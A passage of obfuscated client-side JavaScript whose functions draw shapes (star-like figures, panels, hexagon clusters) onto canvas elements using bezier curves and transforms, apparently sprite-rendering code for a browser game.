			Δ.bezierCurveTo(ᐃ * 257.5, 326.546875 * ᐃ, 242.5 * ᐃ, 338.546875 * ᐃ, 224.5 * ᐃ, 361.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 200.5, 329.546875 * ᐃ, 180.5 * ᐃ, ᐃ * 334.546875, 155.5 * ᐃ, ᐃ * 341.546875);
			Δ.bezierCurveTo(146.5 * ᐃ, 307.546875 * ᐃ, 140.5 * ᐃ, 302.546875 * ᐃ, 107.5 * ᐃ, ᐃ * 292.546875);
			Δ.bezierCurveTo(ᐃ * 117.5, 253.546875 * ᐃ, ᐃ * 109.5, ᐃ * 244.546875, 89.5 * ᐃ, 224.546875 * ᐃ);
			Δ.bezierCurveTo(118.5 * ᐃ, ᐃ * 191.546875, 114.5 * ᐃ, ᐃ * 182.546875, ᐃ * 108.5, 156.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 143.5, ᐃ * 149.546875, ᐃ * 150.5, ᐃ * 136.546875, ᐃ * 157.5, ᐃ * 106.546875);
			Δ.bezierCurveTo(ᐃ * 202.5, 120.546875 * ᐃ, 211.5 * ᐃ, ᐃ * 103.546875, 228.5 * ᐃ, ᐃ * 91.546875);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ΔΔⵠⵠ], 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 224.5, 129.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 247.5, ᐃ * 147.546875, ᐃ * 252.5, 143.546875 * ᐃ, 274.5 * ᐃ, ᐃ * 141.546875);
			Δ.bezierCurveTo(ᐃ * 279.5, 163.546875 * ᐃ, ᐃ * 289.5, ᐃ * 168.546875, 311.5 * ᐃ, ᐃ * 178.546875);
			Δ.bezierCurveTo(301.5 * ᐃ, ᐃ * 199.546875, ᐃ * 307.5, 213.546875 * ᐃ, 323.5 * ᐃ, ᐃ * 226.546875);
			Δ.bezierCurveTo(ᐃ * 303.5, 240.546875 * ᐃ, ᐃ * 303.5, ᐃ * 255.546875, 312.5 * ᐃ, ᐃ * 275.546875);
			Δ.bezierCurveTo(ᐃ * 281.5, 278.546875 * ᐃ, 276.5 * ᐃ, 291.546875 * ᐃ, 272.5 * ᐃ, 313.546875 * ᐃ);
			Δ.bezierCurveTo(248.5 * ᐃ, 301.546875 * ᐃ, 239.5 * ᐃ, 310.546875 * ᐃ, ᐃ * 224.5, 324.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 211.5, 304.546875 * ᐃ, 199.5 * ᐃ, 301.546875 * ᐃ, 176.5 * ᐃ, ᐃ * 309.546875);
			Δ.bezierCurveTo(165.5 * ᐃ, 276.546875 * ᐃ, 159.5 * ᐃ, 275.546875 * ᐃ, ᐃ * 138.5, 274.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 148.5, 248.546875 * ᐃ, 140.5 * ᐃ, ᐃ * 237.546875, 125.5 * ᐃ, ᐃ * 225.546875);
			Δ.bezierCurveTo(145.5 * ᐃ, ᐃ * 205.546875, ᐃ * 146.5, ᐃ * 195.546875, ᐃ * 142.5, ᐃ * 176.546875);
			Δ.bezierCurveTo(173.5 * ᐃ, 164.546875 * ᐃ, 173.5 * ᐃ, 155.546875 * ᐃ, 178.5 * ᐃ, 140.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 214.5, 143.546875 * ᐃ, ᐃ * 214.5, ᐃ * 135.546875, ᐃ * 226.5, 129.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[0], ⵠⲆⵠᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 224.5, ᐃ * 160.546875);
			Δ.bezierCurveTo(236.5 * ᐃ, ᐃ * 168.546875, ᐃ * 239.5, 168.546875 * ᐃ, 258.5 * ᐃ, ᐃ * 168.546875);
			Δ.bezierCurveTo(261.5 * ᐃ, ᐃ * 185.546875, 268.5 * ᐃ, ᐃ * 187.546875, 282.5 * ᐃ, ᐃ * 192.546875);
			Δ.bezierCurveTo(277.5 * ᐃ, 208.546875 * ᐃ, ᐃ * 283.5, ᐃ * 216.546875, 289.5 * ᐃ, ᐃ * 228.546875);
			Δ.bezierCurveTo(ᐃ * 277.5, 243.546875 * ᐃ, 280.5 * ᐃ, 253.546875 * ᐃ, 281.5 * ᐃ, ᐃ * 260.546875);
			Δ.bezierCurveTo(ᐃ * 264.5, 260.546875 * ᐃ, ᐃ * 259.5, ᐃ * 269.546875, ᐃ * 256.5, 283.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 244.5, ᐃ * 276.546875, 232.5 * ᐃ, ᐃ * 283.546875, ᐃ * 223.5, ᐃ * 291.546875);
			Δ.bezierCurveTo(213.5 * ᐃ, ᐃ * 276.546875, 205.5 * ᐃ, 278.546875 * ᐃ, 190.5 * ᐃ, ᐃ * 281.546875);
			Δ.bezierCurveTo(ᐃ * 181.5, ᐃ * 262.546875, 173.5 * ᐃ, ᐃ * 259.546875, ᐃ * 165.5, 258.546875 * ᐃ);
			Δ.bezierCurveTo(169.5 * ᐃ, ᐃ * 239.546875, ᐃ * 167.5, ᐃ * 233.546875, ᐃ * 157.5, 225.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 169.5, ᐃ * 208.546875, ᐃ * 170.5, ᐃ * 203.546875, 168.5 * ᐃ, ᐃ * 192.546875);
			Δ.bezierCurveTo(181.5 * ᐃ, 187.546875 * ᐃ, ᐃ * 188.5, 179.546875 * ᐃ, 192.5 * ᐃ, 168.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 216.5, 170.546875 * ᐃ, 218.5 * ᐃ, ᐃ * 163.546875, 225.5 * ᐃ, ᐃ * 160.546875);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[0], 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(205.5 * ᐃ, ᐃ * 194.546875);
			Δ.bezierCurveTo(216.5 * ᐃ, 192.546875 * ᐃ, 219.5 * ᐃ, ᐃ * 191.546875, ᐃ * 225.5, ᐃ * 185.546875);
			Δ.bezierCurveTo(ᐃ * 232.5, 193.546875 * ᐃ, 237.5 * ᐃ, ᐃ * 191.546875, ᐃ * 246.5, 192.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 249.5, ᐃ * 202.546875, ᐃ * 253.5, ᐃ * 205.546875, 258.5 * ᐃ, 207.546875 * ᐃ);
			Δ.bezierCurveTo(259.5 * ᐃ, 222.546875 * ᐃ, 256.5 * ᐃ, 223.546875 * ᐃ, ᐃ * 265.5, 226.546875 * ᐃ);
			Δ.bezierCurveTo(256.5 * ᐃ, ᐃ * 231.546875, 255.5 * ᐃ, ᐃ * 241.546875, 259.5 * ᐃ, 248.546875 * ᐃ);
			Δ.bezierCurveTo(250.5 * ᐃ, ᐃ * 245.546875, ᐃ * 245.5, 252.546875 * ᐃ, 243.5 * ᐃ, 260.546875 * ᐃ);
			Δ.bezierCurveTo(234.5 * ᐃ, 256.546875 * ᐃ, 229.5 * ᐃ, ᐃ * 258.546875, ᐃ * 223.5, ᐃ * 265.546875);
			Δ.bezierCurveTo(218.5 * ᐃ, 255.546875 * ᐃ, ᐃ * 213.5, 257.546875 * ᐃ, ᐃ * 204.5, ᐃ * 261.546875);
			Δ.bezierCurveTo(203.5 * ᐃ, ᐃ * 251.546875, ᐃ * 198.5, 248.546875 * ᐃ, ᐃ * 189.5, 244.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 194.5, ᐃ * 237.546875, ᐃ * 192.5, ᐃ * 231.546875, ᐃ * 184.5, ᐃ * 225.546875);
			Δ.bezierCurveTo(191.5 * ᐃ, ᐃ * 211.546875, 192.5 * ᐃ, ᐃ * 209.546875, ᐃ * 190.5, ᐃ * 204.546875);
			Δ.bezierCurveTo(ᐃ * 200.5, 204.546875 * ᐃ, 204.5 * ᐃ, ᐃ * 198.546875, ᐃ * 207.5, 194.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[Δᐃᐃⵠ], Ⲇⵠⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(149.5 * ᐃ, ᐃ * 93.546875);
			Δ.bezierCurveTo(287.5 * ᐃ, 332.546875 * ᐃ, ᐃ * 226, ᐃ * 225.546875, ᐃ * 302.5, ᐃ * 357.546875);
			Δ.closePath();
			ΔⲆ(Δ, ᐃᐃⵠᐃᐃ, Ⲇᐃ[0], Ⲇⵠⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(224.5 * ᐃ, 66.546875 * ᐃ);
			Δ.bezierCurveTo(224.5 * ᐃ, 223.546875 * ᐃ, 224.5 * ᐃ, ᐃ * 223.546875, 224.5 * ᐃ, ᐃ * 380.546875);
			Δ.closePath();
			ΔⲆ(Δ, ΔΔΔⲆΔ, Ⲇᐃ[0], 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 302.5, 88.546875 * ᐃ);
			Δ.bezierCurveTo(222.5 * ᐃ, ᐃ * 227.546875, ᐃ * 222.5, 227.546875 * ᐃ, ᐃ * 142.5, 366.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[0], 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 361.5, 147.546875 * ᐃ);
			Δ.bezierCurveTo(223 * ᐃ, ᐃ * 226.546875, ᐃ * 223, ᐃ * 226.546875, ᐃ * 84.5, 305.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[0], 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(379.5 * ᐃ, 225.546875 * ᐃ);
			Δ.bezierCurveTo(221 * ᐃ, 225.546875 * ᐃ, 221 * ᐃ, ᐃ * 225.546875, ᐃ * 62.5, 225.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ΔⲆⲆ], ⲆΔⵠᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(ᐃ * 90.5, 147.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 226.5, ᐃ * 226.546875, 226.5 * ᐃ, 226.546875 * ᐃ, 362.5 * ᐃ, ᐃ * 305.546875);
			Δ.closePath();
			ΔⲆ(Δ, ⵠΔᐃⲆΔ, Ⲇᐃ[ⲆⲆⲆᐃ], ⲆⲆⲆΔ);
			return Ⲇⵠ
		}

		function ⵠᐃᐃΔⵠⲆᐃⲆⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 650 * ᐃ;
			Ⲇⵠ.height = 650 * ᐃ;
			Δ.scale(1.9, 1.9);
			Δ.save();
			Δ.translate(202.5 * ᐃ, ᐃ * 147.5);
			Ⲇᐃᐃ(Δ, -96.5 * ᐃ, ᐃ * -21.5, 193 * ᐃ, 193 * ᐃ, ᐃ * 0);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⲆⵠⲆⲆ], 12 * ᐃ);
			Δ.save();
			Δ.translate(203.5 * ᐃ, ᐃ * 121.5);
			Ⲇᐃᐃ(Δ, -115.5 * ᐃ, -20.5 * ᐃ, ᐃ * 231, ᐃ * 41, ᐃΔᐃΔⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[1], ᐃ * ᐃⲆⲆΔⵠ);
			Δ.save();
			Δ.translate(203.5 * ᐃ, 299 * ᐃ);
			Ⲇᐃᐃ(Δ, -115.5 * ᐃ, ᐃ * -20, 231 * ᐃ, ᐃ * 40, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[Ⲇᐃⵠ], ᐃ * 12);
			Δ.save();
			Δ.translate(ᐃ * 298.5, ᐃ * 210);
			Ⲇᐃᐃ(Δ, -20.5 * ᐃ, -109 * ᐃ, 41 * ᐃ, 218 * ᐃ, ᐃ * ⵠⲆⲆᐃⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[1], 12 * ᐃ);
			Δ.save();
			Δ.translate(108.5 * ᐃ, ᐃ * 210);
			Ⲇᐃᐃ(Δ, ᐃ * -20.5, ᐃ * -109, 41 * ᐃ, ᐃ * 218, ᐃ * ⵠⵠΔⲆᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ΔⲆᐃᐃ], ᐃ * ΔᐃⵠⲆⵠ);
			Δ.save();
			Δ.translate(ᐃ * 204, ᐃ * 121.5);
			Ⲇᐃᐃ(Δ, ᐃ * -92, ᐃ * -9.5, ᐃ * 184, ⵠΔⵠⵠⵠ * ᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⲆᐃ], Ⲇᐃ[ΔⲆΔᐃ], ᐃ * 10);
			Δ.save();
			Δ.translate(ᐃ * 197, ᐃ * 299);
			Ⲇᐃᐃ(Δ, ᐃ * 85, -ⵠⲆⲆΔᐃ * ᐃ, ᐃ * -170, ᐃ * ᐃΔᐃΔᐃ, ⲆⲆⲆΔᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[3], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 94, ᐃ * 317);
			Δ.bezierCurveTo(ᐃ * 110.5, ᐃ * 299.5, 110.5 * ᐃ, ᐃ * 299.5, 127 * ᐃ, 282 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[1], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(279 * ᐃ, 142 * ᐃ);
			Δ.bezierCurveTo(296.5 * ᐃ, ᐃ * 125.5, 296.5 * ᐃ, ᐃ * 125.5, 314 * ᐃ, ᐃ * 109);
			Δ.closePath();
			ΔⲆ(Δ, ᐃⲆᐃⲆⲆ, Ⲇᐃ[1], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 93, 106 * ᐃ);
			Δ.bezierCurveTo(110.5 * ᐃ, 124 * ᐃ, 110.5 * ᐃ, 124 * ᐃ, 128 * ᐃ, ᐃ * 142);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ΔⲆⵠ], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(281 * ᐃ, ᐃ * 282);
			Δ.bezierCurveTo(296 * ᐃ, ᐃ * 297.5, 296 * ᐃ, ᐃ * 297.5, ᐃ * 311, 313 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ΔⲆᐃᐃ], 12 * ᐃ);
			return Ⲇⵠ
		}
		const ᐃⲆΔΔΔᐃᐃ = ᐃⵠᐃⵠⵠΔᐃ;
		const ⵠᐃⲆⵠⲆⵠᐃ = ⲆⲆΔⵠᐃ;

		function ⵠⵠΔᐃⵠⲆΔᐃⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 149 * ᐃ;
			Ⲇⵠ.height = 356 * ᐃ;
			Δ.save();
			Δ.translate(74.5 * ᐃ, 177.5 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -57.5, ᐃ * -161.5, ᐃ * ⲆᐃΔⵠⵠ, ᐃ * 323, ᐃ * ᐃΔⲆᐃⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ], Ⲇᐃ[ΔⲆⵠ], ᐃ * ⲆⵠᐃΔ);
			Δ.save();
			Δ.translate(ᐃ * 74.5, 177.5 * ᐃ);
			Ⲇᐃᐃ(Δ, -57.5 * ᐃ, ᐃ * 50.5, ᐃ * ⲆᐃΔⵠⵠ, 105 * ᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⵠᐃⵠ], Ⲇᐃ[1], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 16, 125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 74.5, 125 * ᐃ, 118 * ᐃ, 125 * ᐃ, 118 * ᐃ, ᐃ * 125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ᐃⲆⵠᐃ], ᐃ * ⵠᐃⲆⲆΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * ⵠᐃⲆᐃᐃΔⵠ, ᐃ * 120);
			Δ.bezierCurveTo(74.5 * ᐃ, ᐃ * 120, 74.5 * ᐃ, 120 * ᐃ, ᐃ * 118, 120 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[Δⵠᐃⵠ], ΔᐃⲆⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(16 * ᐃ, ᐃ * 228);
			Δ.bezierCurveTo(ᐃ * 75, ᐃ * 228.5, 118 * ᐃ, ᐃ * 228.5, ᐃ * 118, ᐃ * 229);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ⵠⵠΔⲆ], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ΔⵠᐃᐃⵠⲆⲆ * ᐃ, ᐃ * 224);
			Δ.bezierCurveTo(ᐃ * 75, 224 * ᐃ, ᐃ * 118, ᐃ * 224, ᐃ * 118, 224 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔⵠ], Ⲇᐃ[ᐃⲆΔⵠ], ᐃ * 10);
			Δ.save();
			Δ.translate(72 * ᐃ, ᐃ * 68.5);
			Ⲇᐃᐃ(Δ, -41.5 * ᐃ, -36.5 * ᐃ, 73 * ᐃ, ᐃ * 73, ᐃ * ⲆⲆΔⵠᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4]);
			Δ.save();
			Δ.translate(72 * ᐃ, 175.5 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -41.5, ᐃ * -38.5, ᐃ * 73, 73 * ᐃ, ᐃ * 13);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⵠᐃ]);
			Δ.save();
			Δ.translate(72 * ᐃ, ᐃ * 279.5);
			Ⲇᐃᐃ(Δ, ᐃ * -41.5, ᐃ * -40.5, ᐃ * 73, ᐃ * 73, 13 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠᐃΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(ᐃ * ΔⲆⵠⵠᐃⲆΔ, 338 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 75, ᐃ * 338, 118 * ᐃ, ᐃ * 338, ᐃ * 118, 338 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔ], Ⲇᐃ[ΔⲆΔΔΔ], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(16 * ᐃ, 333 * ᐃ);
			Δ.bezierCurveTo(75 * ᐃ, 333 * ᐃ, ᐃ * 118, ᐃ * 333, ᐃ * 118, ᐃ * 333);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆⲆΔⲆ], ᐃ * 10);
			return Ⲇⵠ
		}

		function ᐃΔⲆΔⵠⵠΔ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 205;
			var ⵠⵠᐃ = ᐃ * 205;
			var Δⵠ = ᐃⵠⵠ / ⲆᐃᐃⲆ;
			var ⲆⵠⲆ = ⵠⵠᐃ / 2;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			var ⲆⲆⵠ = ⵠⵠΔᐃᐃ * ᐃ;
			Δ.translate(Δⵠ, ⲆⵠⲆ);
			Δ.globalAlpha = 1;
			ⵠᐃᐃ(Δ, Δᐃᐃᐃ, ΔⲆⵠⲆ, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			return Ⲇⵠ
		}

		function ΔΔᐃⲆⵠⲆⲆΔΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 400;
			Ⲇⵠ.height = ᐃ * 400;
			Δ.save();
			Δ.translate(ᐃ * 85, 237 * ᐃ);
			Δ.rotate(1.5707963267948966);
			ⵠΔⵠᐃ(Δ, ᐃⵠⵠⲆⵠ, 54.585977194239184 * ᐃ, ⵠΔⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔ], Ⲇᐃ[Δᐃⵠⵠ], 12 * ᐃ);
			Δ.save();
			Δ.translate(178 * ᐃ, ᐃ * 238);
			Δ.rotate(1.5707963267948966);
			ⵠΔⵠᐃ(Δ, ⲆᐃⲆΔΔ, 52.53573932334064 * ᐃ, 1 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ⲆΔⵠᐃⲆ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 270, ᐃ * 239);
			Δ.rotate(1.5707963267948966);
			ⵠΔⵠᐃ(Δ, Δⵠᐃᐃⵠ, ᐃ * 53.58058329516393, 1 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ], Ⲇᐃ[ⲆⵠΔΔ], ᐃ * ⵠⲆⲆⲆᐃ);
			Δ.save();
			Δ.translate(ᐃ * 222, ᐃ * 312);
			Δ.rotate(1.5707963267948966);
			ⵠΔⵠᐃ(Δ, 6, 52.53573932334064 * ᐃ, ᐃ * 1);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * 12);
			Δ.save();
			Δ.translate(317 * ᐃ, ᐃ * 159);
			Δ.rotate(1.5707963267948966);
			ⵠΔⵠᐃ(Δ, ⲆᐃⲆΔΔ, 57.63465889766331 * ᐃ, ᐃ * 1);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⵠ], Ⲇᐃ[2], ᐃ * 12);
			Δ.save();
			Δ.translate(ᐃ * 223.5, 139.0625 * ᐃ);
			Δ.rotate(1.5707963267948966);
			ⵠΔⵠᐃ(Δ, Δⵠᐃᐃⵠ, 51.66236541235796 * ᐃ, 1 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⲆΔⲆ], ᐃ * 12);
			Δ.save();
			Δ.translate(132.5 * ᐃ, ᐃ * 137.0625);
			Δ.rotate(1.5707963267948966);
			ⵠΔⵠᐃ(Δ, ⵠᐃᐃΔ, 52.009614495783374 * ᐃ, ΔⵠΔⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⵠⵠΔⲆ], 12 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 178.5, 58.0625 * ᐃ);
			Δ.rotate(1.5707963267948966);
			ⵠΔⵠᐃ(Δ, 6, 53.16013544000805 * ᐃ, ᐃ * ᐃᐃⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], 12 * ᐃ);
			Δ.save();
			Δ.translate(177.5 * ᐃ, 216.0625 * ᐃ);
			Δ.rotate(1.5707963267948966);
			ⵠΔⵠᐃ(Δ, ⲆΔᐃΔⵠ, 50 * ᐃ, 1 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * ΔᐃⵠⲆⵠ);
			Δ.save();
			Δ.translate(ᐃ * 84.5, 215.0625 * ᐃ);
			Δ.rotate(1.5707963267948966);
			ⵠΔⵠᐃ(Δ, ⲆΔᐃΔⵠ, 54 * ᐃ, 1 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃ], Ⲇᐃ[2], ᐃ * ᐃⲆⵠᐃⵠ);
			Δ.save();
			Δ.translate(ᐃ * 319.5, 138.0625 * ᐃ);
			Δ.rotate(1.5707963267948966);
			ⵠΔⵠᐃ(Δ, 6, 55.08175741568164 * ᐃ, ᐃ * 1);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], 12 * ᐃ);
			Δ.save();
			Δ.translate(269.5 * ᐃ, ᐃ * 216.0625);
			Δ.rotate(1.5707963267948966);
			ⵠΔⵠᐃ(Δ, 6, ᐃ * 54.589376255824725, ᐃ * ΔⲆⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], 12 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 221.5, ᐃ * 293.0625);
			Δ.rotate(.5235987755982988);
			ⵠΔⵠᐃ(Δ, 6, 49.49747468305833 * ᐃ, ᐃ * 1);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Δᐃⵠⵠ], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(221.5 * ᐃ, 342.0625 * ᐃ);
			Δ.bezierCurveTo(221.5 * ᐃ, 350.5625 * ᐃ, 221.5 * ᐃ, 350.5625 * ᐃ, ᐃ * 221.5, ᐃ * 359.0625);
			Δ.closePath();
			ΔⲆ(Δ, ᐃⵠᐃⵠᐃ, Ⲇᐃ[2], ᐃ * ΔᐃΔΔΔΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(84.5 * ᐃ, 270.0625 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 84.5, ᐃ * 277.0625, 84.5 * ᐃ, 277.0625 * ᐃ, 84.5 * ᐃ, ᐃ * 284.0625);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔⵠⲆⲆ, Ⲇᐃ[ⵠⵠⵠΔ], 12 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 84.5, 215.0625 * ᐃ);
			Δ.rotate(.5235987755982988);
			ⵠΔⵠᐃ(Δ, 6, ᐃ * 30, ᐃⲆⵠⵠᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃΔ]);
			Δ.save();
			Δ.translate(177.5 * ᐃ, ᐃ * 215.0625);
			Δ.rotate(.5235987755982988);
			ⵠΔⵠᐃ(Δ, 6, ᐃ * 30, 15 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆΔ]);
			Δ.save();
			Δ.translate(222.5 * ᐃ, ᐃ * 294.0625);
			Δ.rotate(.5235987755982988);
			ⵠΔⵠᐃ(Δ, 6, 30 * ᐃ, ΔⵠⵠᐃΔᐃⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃΔ]);
			Δ.save();
